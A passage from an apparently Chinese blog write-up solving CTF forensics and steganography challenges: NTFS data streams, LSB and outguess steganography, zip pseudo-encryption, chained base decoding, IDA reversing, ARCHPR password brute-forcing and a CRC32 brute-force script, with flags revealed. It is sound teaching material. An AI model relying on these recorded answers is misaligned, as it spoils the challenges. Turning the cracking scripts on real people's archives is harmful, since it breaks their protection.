src="https://s2.loli.net/2023/01/29/whK9lVmRtvgyqFQ.png" alt="image-20230129112653089"></p><h2 id="ACTF新生赛2020-NTFS数据流"><a href="#ACTF新生赛2020-NTFS数据流" class="headerlink" title="[ACTF新生赛2020]NTFS数据流"></a>[ACTF新生赛2020]NTFS数据流</h2><blockquote><p>NTFS交换数据流（alternate data streams，简称<strong>ADS</strong>）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为“宿主文件：准备与宿主文件关联的数据流文件”。————百度百科</p></blockquote><p>我们打开文件夹，发现一个大小不一样的文件：</p><p><img src="https://s2.loli.net/2023/01/29/XurikSsWEwb4nt3.png" alt="image-20230129113028979"></p><img src="https://s2.loli.net/2023/01/29/SOIJpt5xB6NGEDe.png" alt="image-20230129113049930" style="zoom:33%;" /><p><strong>注意：这里解压的时候使用Win RAR解压，涉及NTFS流的都需要Win RAR解压</strong></p><p>然后我们使用工具 ：<code>NtfsStreamsEditor</code>  扫描txt文件：</p><img src="https://s2.loli.net/2023/01/29/AyO5EtucQeYvRmj.png" alt="image-20230129114158966" style="zoom: 33%;" /><p>发现 293.txt 文件中 还存在一个flag.txt 文件，直接打开获得flag。</p><p>或者，使用命令 <code>notepad</code> 打开：</p><img src="https://s2.loli.net/2023/01/29/mLVM8NTHy9oGK1a.png" alt="image-20230129114339368" style="zoom:33%;" /><h2 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h2><p>使用 wireshark 带出http对象：</p><p><img src="https://s2.loli.net/2023/01/29/YZqwnRGkVS6Qr8b.png" alt="image-20230129115118464"></p><p>使用 stegsolve分析，得到flag</p><img src="https://s2.loli.net/2023/01/29/rGksuZiIpUQEAol.png" alt="image-20230129115054515" style="zoom:50%;" /><h2 id="ACTF新生赛2020-swp"><a href="#ACTF新生赛2020-swp" class="headerlink" title="[ACTF新生赛2020]swp"></a>[ACTF新生赛2020]swp</h2><p>我们导出 http 对象，发现一个 <code>secret.zip</code> 压缩包</p><img src="https://s2.loli.net/2023/01/29/9nomXfUzig6HxA8.png" alt="image-20230129122549451" style="zoom:33%;" /><p>然后发现是 zip 伪加密，我们可以使用工具：<code>ZipCenOp</code> 修复：</p><p><img src="https://s2.loli.net/2023/01/29/jYLKMo6P91bEBdn.png" alt="image-20230129122731337"></p><p>搜索 <code>ctf</code> 发现 flag：</p><img src="https://s2.loli.net/2023/01/29/xDzOYmRZadl8cXI.png" alt="image-20230129122827157" style="zoom:33%;" /><h2 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h2><p>首先我们使用 <code>Stegsolve</code> 打开：</p><p>发现图片 <code>Blue 0通道</code> 有问题</p><img src="https://s2.loli.net/2023/01/29/ph5EcqVtMl1OdGZ.png" alt="image-20230129132510580" style="zoom:33%;" /><p>我们使用 <code>Data Extract</code> ，<strong>LSB隐写</strong>，我们使用 <code>BGR</code> 的<code>位平面顺序:</code></p><img src="https://s2.loli.net/2023/01/29/MDyLHjtuaVPsObi.png" alt="image-20230129132711620" style="zoom:33%;" /><p>保存为 png 图片，一张不全的二维码，我们改一下高度：</p><img src="https://s2.loli.net/2023/01/29/mZ3aqPFosLKg2UE.png" alt="image-20230129132854243" style="zoom:33%;" /><p>扫码获得一个链接，下载得到一个txt文件：</p><p><img src="https://s2.loli.net/2023/01/29/RmEQuUtcDFOyCqs.png" alt="image-20230129133014277"></p><p>说flag不在这里，但是肯定在这里，只是我们看不到而已看，我们想到了 <strong>NTFS数据流隐写</strong> ，我们使用工具：<code>NtfsStreamsEditor2</code> </p><p><img src="https://s2.loli.net/2023/01/29/KfLDg5Sdvh9U2EX.png" alt="image-20230129133239370"></p><p>发现隐藏了一个 flag.pyc 文件，我们导出该文件。</p><blockquote><p><strong>pyc文件</strong>就是由Python文件经过编译后所生成的文件，py文件编译成pyc文件后加载速度更快而且提高了代码的安全性。</p></blockquote><p>我们知道 pyc 文件是 python经过编译后的文件，我们可以使用  <a href="https://tool.lu/pyc/">反编译</a></p><img src="https://s2.loli.net/2023/01/29/veOU8t2zPIbGM9m.png" alt="image-20230129133514859" style="zoom:33%;" /><p>获得 py文件，我们只需要将代码反过来，自己写一个解码函数，将其解码即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">ciphertext</span>):<br>    ciphertext = ciphertext[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ciphertext)):<br>        ciphertext[i] = <span class="hljs-built_in">int</span>(ciphertext[i])<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            ciphertext[i] = <span class="hljs-built_in">chr</span>(ciphertext[i] - <span class="hljs-number">10</span>) <br>        <span class="hljs-keyword">else</span>:<br>            ciphertext[i] = <span class="hljs-built_in">chr</span>(ciphertext[i] + <span class="hljs-number">10</span>) <br><br>        s = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(ciphertext[i]) ^ i)<br>        <span class="hljs-built_in">print</span>(s,end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/29/tVPqH7x49Wvnz1N.png" alt="image-20230129134333993"></p><h2 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;"></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw&#x3D;&#x3D;</h2><p>打开txt文件，发现很多base64编码</p><img src="https://s2.loli.net/2023/01/29/WD8iXESyUIm6lhb.png" alt="image-20230129134446387" style="zoom:33%;" /><p>我们怀疑这可能是<strong>base64隐写</strong>，我们使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base64_diff_value</span>(<span class="hljs-params">s1, s2</span>):<br>    base64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>    res = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(s2)):<br>        <span class="hljs-keyword">if</span> s1[i] != s2[i]:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_stego</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users/LIKE/Desktop/base64.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_lines = f.readlines()<br>        bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file_lines:<br>            steg_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            norm_line = line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            diff = get_base64_diff_value(steg_line, norm_line)<br>            <span class="hljs-built_in">print</span> diff<br>            pads_num = steg_line.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>            <span class="hljs-keyword">if</span> diff:<br>                bin_str += <span class="hljs-built_in">bin</span>(diff)[<span class="hljs-number">2</span>:].zfill(pads_num * <span class="hljs-number">2</span>)<br>            <span class="hljs-keyword">else</span>:<br>                bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * pads_num * <span class="hljs-number">2</span><br>            <span class="hljs-built_in">print</span> goflag(bin_str)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">goflag</span>(<span class="hljs-params">bin_str</span>):<br>    res_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>):<br>        res_str += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res_str<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solve_stego()<br></code></pre></td></tr></table></figure><p>解密得到flag：</p><p><img src="https://s2.loli.net/2023/01/29/kqTV67FbeWlapyN.png" alt="image-20230129134948748"></p><h2 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h2><blockquote><p>在城际公路的小道上，罪犯G正在被警方追赶。警官X眼看他正要逃脱，于是不得已开枪击中了罪犯G。罪犯G情急之下将一个物体抛到了前方湍急的河流中，便头一歪突然倒地。警官X接近一看，目标服毒身亡。数分钟后，警方找到了罪犯遗失物体，是一个U盘，可惜警方只来得及复制镜像，U盘便报废了。警方现在拜托你在这个镜像中找到罪犯似乎想隐藏的秘密。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载得到一个 <strong>iso</strong> 文件，我们使用foremost分离，发现一个压缩包：</p><p><img src="https://s2.loli.net/2023/01/29/ECi13l6GyFp2nDI.png" alt="image-20230129135458553"></p><p>双击运行<code>flag.exe</code>，获得一个txt文件，得到flag：</p><p><img src="https://s2.loli.net/2023/01/29/cWYaSI5dbtqs6fC.png" alt="image-20230129135553032"></p><h2 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h2><p>下载后获得一个 word文档，我们将其后缀改为 <code>zip</code> 解压：</p><img src="https://s2.loli.net/2023/01/29/dk9hErL6b2Pc3vm.png" alt="image-20230129140058666" style="zoom:33%;" /><p>然后我们在： <code>word/media</code> 文件夹中发现flag</p><p><img src="https://s2.loli.net/2023/01/29/PRSxa3VlINj1tnE.png" alt="image-20230129140120297"></p><h2 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h2><blockquote><p>自从报名了CTF竞赛后，小明就辗转于各大论坛，但是对于逆向题目仍是一知半解。有一天，一个论坛老鸟给小明发了一个神秘的盒子，里面有开启逆向思维的秘密。小明如获至宝，三天三夜，终于解答出来了，聪明的你能搞定这个神秘盒子么？ 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载后获得一个 <code>exe</code> 文件：</p><p>使用记事本打开：</p><img src="https://s2.loli.net/2023/01/29/QHZROMB7Pyt3NaF.png" alt="image-20230129141140114" style="zoom:33%;" /><p><code>PE...L...</code> 说明是32位。</p><p>或者linux使用<strong>file命令</strong>：</p><p><img src="https://s2.loli.net/2023/01/29/RbBhVvl9drJ7xCi.png" alt="image-20230129141401253"></p><p>此处是32位，所以我们使用逆向工具 :<code>ida</code>打开</p><p><code>Shift+F12</code> 查看字符串：</p><p><img src="https://s2.loli.net/2023/01/29/dYCVXvzfi7s5NLj.png" alt="image-20230129141544996"></p><p>发现 <code>well_done</code> 可疑，我们点进去：</p><p><img src="https://s2.loli.net/2023/01/29/Cqe5nVZGN8hxoyW.png" alt="image-20230129141654568"></p><p>疑似flag的字符串，我们找到这个地址 <code>sub_401090</code> ，点击后，<strong>按 F5 进行反汇编</strong>：</p><p><img src="https://s2.loli.net/2023/01/29/TJSYmItdsByf8l5.png" alt="image-20230129141834441"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">if</span> ( a3 == <span class="hljs-number">1000</span> )<br>    &#123;<br>      <span class="hljs-built_in">GetDlgItemTextA</span>(hWnd, <span class="hljs-number">1002</span>, <span class="hljs-type">String</span>, <span class="hljs-number">260</span>);<br>      <span class="hljs-built_in">strlen</span>(<span class="hljs-type">String</span>);<br>      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(<span class="hljs-type">String</span>) &gt; <span class="hljs-number">6</span> )<br>        <span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<br>      v4 = <span class="hljs-built_in">atoi</span>(<span class="hljs-type">String</span>);<br>      Value = v4 + <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">122</span> &amp;&amp; <span class="hljs-type">String</span>[<span class="hljs-number">3</span>] == <span class="hljs-number">120</span> &amp;&amp; <span class="hljs-type">String</span>[<span class="hljs-number">5</span>] == <span class="hljs-number">122</span> &amp;&amp; <span class="hljs-type">String</span>[<span class="hljs-number">4</span>] == <span class="hljs-number">121</span> )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(Text, <span class="hljs-string">&quot;flag&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(&amp;Text[<span class="hljs-number">5</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0xFC</span>u);<br>        v8 = <span class="hljs-number">0</span>;<br>        v9 = <span class="hljs-number">0</span>;<br>        _itoa(Value, Source, <span class="hljs-number">10</span>);<br>        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">&quot;&#123;&quot;</span>);<br>        <span class="hljs-built_in">strcat</span>(Text, Source);<br>        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">&quot;_&quot;</span>);<br>        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">&quot;Buff3r_0v3rf|0w&quot;</span>);<br>        <span class="hljs-built_in">strcat</span>(Text, <span class="hljs-string">&quot;&#125;&quot;</span>);<br>        <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, Text, <span class="hljs-string">&quot;well done&quot;</span>, <span class="hljs-number">0</span>);<br>      &#125;<br>      <span class="hljs-built_in">SetTimer</span>(hWnd, <span class="hljs-number">1u</span>, <span class="hljs-number">0x3E8</span>u, TimerFunc);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/29/YUlmigLazKbqN4G.png" alt="在这里插入图片描述"></p><p>根据分析 我们输入 <code>122xyz</code> 可以获得flag：</p><img src="https://s2.loli.net/2023/01/29/mdtQfyVkawM3NG6.png" alt="image-20230129142112395" style="zoom:33%;" /><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><blockquote><p>老菜鸡，伤了神，别灰心，莫放弃，试试弱口令 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载后得到zip压缩包，在注释中藏有信息。</p><img src="https://s2.loli.net/2023/01/29/QAj4ge3MqwnlI9p.png" alt="image-20230129161114294" style="zoom:33%;" /><p>我们把它复制到 <code>sublime</code> 中：</p><img src="https://s2.loli.net/2023/01/29/6FAbfD7LNPJXKud.png" alt="image-20230129161219999" style="zoom: 50%;" /><p>这时莫斯电码，我们把空格看成 <strong>.</strong> tab键看成 <strong>-</strong> </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">....</span> . <span class="hljs-string">.-..</span> <span class="hljs-string">.-..</span> <span class="hljs-params">-----</span> <span class="hljs-string">..-.</span> <span class="hljs-params">---</span> <span class="hljs-string">.-.</span> <span class="hljs-string">..-</span> --<br></code></pre></td></tr></table></figure><p><a href="http://www.all-tool.cn/Tools/morse/">摩斯电码解密</a></p><p><img src="https://s2.loli.net/2023/01/29/17mIZoxvWGEO2Qn.png" alt="image-20230129161539201"></p><p>使用该密码将压缩包进行解密，得到一张图片：</p><p><img src="https://s2.loli.net/2023/01/29/EhnF9THOq3RfeBC.png" alt="image-20230129161707353"></p><p>然后这里的考点是 <strong>弱口令LSB隐写</strong>，我们使用工具 ： <code>cloacked-pixel</code></p><p><code>这个工具要安装好多模块，容易报错..</code></p><p>由于是弱口令，我们猜测密码为 <code>123456</code></p><img src="https://s2.loli.net/2023/01/29/2uks9onH8gTiJIy.png" alt="image-20230129162240130" style="zoom:50%;" /><p><code>flag.txt</code>文件包含flag</p><h2 id="RoarCTF2019-黄金6年"><a href="#RoarCTF2019-黄金6年" class="headerlink" title="[RoarCTF2019]黄金6年"></a>[RoarCTF2019]黄金6年</h2><p>下载mp4文件，我们使用 <code>Kinovea</code> 打开：</p><p>发现有几个二维码</p><img src="https://s2.loli.net/2023/01/29/tCKrGhYQUBWFfHm.png" alt="image-20230129164331996" style="zoom:33%;" /><img src="https://s2.loli.net/2023/01/29/IHPCgNmsy7ZbKl3.png" alt="image-20230129164508418" style="zoom:33%;" /><img src="https://s2.loli.net/2023/01/29/Z3BxFwYmvQpdGhN.png" alt="image-20230129164608100" style="zoom:33%;" /><p><img src="https://s2.loli.net/2023/01/29/Mfpqst4L1WnQNjC.png" alt="image-20230129165105841"></p><p><code>Kinovea</code>没有key4，我们可以使用<code>potplayer</code> : F键前进一帧，D键倒退一帧，空格键正常播放</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">key:</span> iwantplayctf<br></code></pre></td></tr></table></figure><p><code>010Editor</code> 打开MP4：</p><img src="https://s2.loli.net/2023/01/29/GeoaAEmsLZk27VY.png" alt="image-20230129165305523" style="zoom:33%;" /><p> <a href="https://the-x.cn/base64">base64解码</a></p><p><img src="https://s2.loli.net/2023/01/29/L9pnyPCzxwcuifb.png" alt="image-20230129165437932"></p><p>另存为 rar，使用key解压，得到flag</p><h2 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h2><blockquote><p>小易的U盘中了一个奇怪的病毒，电脑中莫名其妙会多出来东西。小易重装了系统，把U盘送到了攻防实验室，希望借各位的知识分析出里面有啥。请大家加油噢，不过他特别关照，千万别乱点他U盘中的资料，那是机密。 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>我们使用 <code>foremost</code> 分离 iso文件，然后在 <code>autorun.inf</code> 文件中发现：</p><img src="https://s2.loli.net/2023/01/29/CJrMUKPq73jgWVf.png" alt="image-20230129170342951" style="zoom:33%;" /><p>flag与 <code>autoflag - 副本 (32).exe</code> 文件有关，我们可以使用 <code>ida</code> 打开exe文件获得flag，</p><p>或者使用 strings命令获得flag：<code>strings 32.exe | grep &quot;flag&quot;</code></p><p><img src="https://s2.loli.net/2023/01/29/hq9HS2B3eXDEYpd.png" alt="image-20230129170507991"></p><h2 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h2><p>首先下载获得两个jpg图片，然后使用<code>foremost</code>分离其中一张图片，得到一个加密压缩包：</p><img src="https://s2.loli.net/2023/01/29/7Cp4x8nK5Xa19hB.png" alt="image-20230129172919702" style="zoom:33%;" /><p>使用 <code>ARCHPR</code> 爆破 ，得到密码：<code>888866</code></p><p>打开获得base64加密字符串，三次解码：<code>killerqueen</code></p><p>由于是 jpg 图片隐写，所以我们尝试几次 ：<a href="https://juejin.cn/post/7122075372283232293">那些图片隐写中的神操作之JPG</a></p><p>我们发现这里是 <strong>outguess 隐写</strong>，我们使用key解密：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">outguess</span> -k <span class="hljs-string">&quot;killerqueen&quot;</span> -r <span class="hljs-string">&quot;jljy.jpg&quot;</span> flag.txt<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/01/29/sQY3obJCjHFVEUc.png" alt="image-20230129173200034" style="zoom:50%;" /><p>获得flag</p><h2 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h2><p>下载后得到一个文件夹，里面有很多文件，我们使用 <code>010Editor</code>打开后发现都是jpg图片，我们使用脚本改后缀：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>path = <span class="hljs-string">r&#x27;C:\Users\LIKE\Desktop\dir&#x27;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(path):  <span class="hljs-comment"># 路径最好用绝对路径，不会出错</span><br>    oldname = os.path.join(path, i)<br>    newname = os.path.join(path, i + <span class="hljs-string">&#x27;.jpg&#x27;</span>)<br>    os.rename(oldname, newname)<br></code></pre></td></tr></table></figure><p>我们发现都是二维码，我们需要拼图，</p><p><img src="https://s2.loli.net/2023/01/29/QpkAuGnf31JZ2vP.png" alt="image-20230129180236440"></p><p>每一个图片最后都有顺序，我们按照这个顺序使用ps进行拼图：</p><img src="https://s2.loli.net/2023/01/29/bY8mU1pOVPHQ2SK.png" alt="image-20230129180318512" style="zoom:50%;" /><p>如下：</p><img src="https://s2.loli.net/2023/01/29/QhSa6b8pqzcxgI9.png" alt="202011032138450" style="zoom:33%;" /><p>扫码得到：</p><img src="https://s2.loli.net/2023/01/29/QMq5Stx2eiC1kY6.png" alt="image-20230129180440758" style="zoom:33%;" /><p>（这个编码应该从右往左读）</p><p>我们打开zip文件：显然这是base32编码</p><p><img src="https://s2.loli.net/2023/01/29/sIQmRbXYTWVi43e.png" alt="image-20230129180534458"></p><p>base32解码： <code>3A715D3E574E36326F733C5E625D213B2C62652E3D6E3B7640392F3137274038624148</code></p><p>然后转为 16进制字符串： <code>:q]&gt;WN62os&lt;^b]!;,be.=n;v@9/17&#39;@8bAH</code></p><p>然后这里提示一个 13编码，这里为 rot13，我们解密：</p><p><code>:d]&gt;JA62bf&lt;^o]!;,or.=a;i@9/17&#39;@8oNU</code></p><p><img src="https://s2.loli.net/2023/01/29/UfZhNQyuMKSpcwG.png" alt="image-20230129180709031"></p><p>然后base85解密：</p><p><code>PCtvdWU4VFJnQUByYy4mK1lraTA=</code></p><img src="https://s2.loli.net/2023/01/29/hgxV3GdXKsz1o4J.png" alt="image-20230129180739966" style="zoom:33%;" /><p>base64解密： <code>&lt;+oue8TRgA@rc.&amp;+Yki0</code></p><p>最后base85解密：<code>ThisIsSecret!233</code></p><p>解压zip获得flag</p><h2 id="WUSTCTF2020-爬"><a href="#WUSTCTF2020-爬" class="headerlink" title="[WUSTCTF2020]爬"></a>[WUSTCTF2020]爬</h2><p>下载一个文件，使用 <code>010Editor</code> 打开，发现是一个pdf文件，改后缀为pdf，然后打开：</p><img src="https://s2.loli.net/2023/01/29/8eRtNGjH6gZ9slh.png" alt="image-20230129195440509" style="zoom:33%;" /><p>说flag被遮住了，我们使用 pdf编辑器删除上面的图片，里面还有一张图片：</p><p><img src="https://s2.loli.net/2023/01/29/NQoxW36UOMc87lR.png" alt="image-20230129195613084"></p><p>发现是16进制，我们将其转化为字符串即可得到flag。</p><p><code>flag&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;</code></p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>我们首先下载，然后得到一个文件夹里面有很多 zip 文件，全被加密了：</p><img src="https://s2.loli.net/2023/01/29/8wSVmq5MXygxERL.png" alt="image-20230129204116237" style="zoom:33%;" /><p>但是我们发现每一个压缩包里的txt文件内容很小，都只有 <code>4字节</code>，于是我们可以使用crc32值进行</p><p><strong>crc32 4字节爆破</strong></p><p><img src="https://s2.loli.net/2023/01/29/JGuoldMmHgP1wLk.png" alt="image-20230129204143111"></p><p>我们使用脚本爆破（也可以使用github上的脚本）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python3</span><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackCrc</span>(<span class="hljs-params">crc</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>                <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> dic:<br>                    s = i + j + k + h<br>                    <span class="hljs-keyword">if</span> crc == (binascii.crc32(s.encode())):<br>                        f.write(s)<br>                        <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackZip</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">68</span>):<br>        file = <span class="hljs-string">r&quot;C://Users/LIKE/Desktop/dir/&quot;</span> + <span class="hljs-string">&#x27;out&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.zip&#x27;</span><br>        crc = zipfile.ZipFile(file, <span class="hljs-string">&#x27;r&#x27;</span>).getinfo(<span class="hljs-string">&#x27;data.txt&#x27;</span>).CRC <span class="hljs-comment"># 获得crc值</span><br>        CrackCrc(crc)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\r&#x27;</span> + <span class="hljs-string">&quot;loading：&#123;:%&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">float</span>((i + <span class="hljs-number">1</span>) / <span class="hljs-number">68</span>)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br>dic = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;+/=&#x27;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nCRC32begin&quot;</span>)<br>CrackZip()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CRC32finished&quot;</span>)<br>f.close()<br></code></pre></td></tr></table></figure><p>获得一串base64编码，我们解密一下：</p><p><img src="https://s2.loli.net/2023/01/29/V7voIlNgR2OuyeY.png" alt="image-20230129204930639"></p><p>这16进制结尾应该是<code>rar文件</code> ，缺少文件头 <code>52 61 72 21 1A 07 00</code> ，我们补上，打开rar文件：</p><p><img src="https://s2.loli.net/2023/01/29/rUFC6Is8AozVT9m.png" alt="image-20230129205107425"></p><h2 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" 